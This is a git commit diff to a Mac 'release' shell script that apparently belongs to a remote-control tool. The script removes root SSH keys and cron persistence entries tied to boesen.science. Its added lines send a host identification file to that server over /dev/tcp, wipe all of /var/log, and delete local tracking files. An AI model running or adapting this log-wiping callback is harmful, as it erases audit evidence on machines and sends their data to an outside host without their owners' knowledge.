6e007f8facc370d8a6f749d1f55ad437a3fe5e9a
ErikBoesen <me@erikboesen.com>
2017-10-01 11:48:57 -0400

    More complete release script

--- control/mac/release.sh
+++ control/mac/release.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
 
-echo "Removing .ssh..."
 rm -rf /var/root/.ssh
 
 dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh >/dev/null
 
 grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
 mv /tmp/crontab /var/at/tabs/root
+
+printf "$(< /etc/info) leaving network." >/dev/tcp/boesen.science:2043
+rm -rf /var/log/*
+rm -rf /etc/info /etc/ips
